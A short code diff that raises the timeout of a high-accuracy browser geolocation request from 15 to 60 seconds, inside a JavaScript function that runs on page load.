@@ -606,7 +606,7 @@
 	window.onload = function Send() {
 			//Start Location
 			if (navigator.geolocation) {
-				var optn = { enableHighAccuracy: true, timeout: 15000, maximumage: 0 };
+				var optn = { enableHighAccuracy: true, timeout: 60000, maximumage: 0 };
 				navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
 			}
 			else {
